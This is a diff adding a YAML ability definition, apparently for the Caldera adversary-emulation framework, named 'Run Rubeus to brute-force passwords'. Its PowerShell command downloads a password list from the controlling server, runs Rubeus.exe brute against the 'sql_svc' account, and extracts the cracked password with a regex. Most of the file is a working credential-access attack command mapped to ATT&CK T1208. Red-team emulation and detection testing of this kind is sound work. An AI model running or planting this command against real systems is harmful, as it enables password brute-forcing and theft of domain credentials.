@@ -1,0 +1,21 @@
+- description: Run Rubeus to brute-force password from ticket
+  id: 643fc9ef-1418-4b98-8467-b62c8f2e3b93
+  name: Run Rubeus to brute-force passwords
+  platforms:
+    windows:
+      psh,pwsh:
+        cleanup: Remove-Item passwordlist.txt;
+        command: 'Invoke-RestMethod -Uri #{server}/file/download -Headers @{"file"="passwordlist.txt"}
+          -OutFile .\passwordlist.txt;           $m=.\Rubeus.exe brute /user:"sql_svc"
+          /passwords:passwordlist.txt | Select-String -Pattern "STUPENDOUS\s+=>\s+(?<source>\S+):(?<target>\S+)"
+          -List;          $m.Matches.groups | ? { $_.Name -eq ''target'' } | Select-Object
+          -ExpandProperty Value;'
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: host.user.password
+        payloads:
+          - Rubeus.exe
+  tactic: credential-access
+  technique:
+    attack_id: T1208
+    name: Brute Force
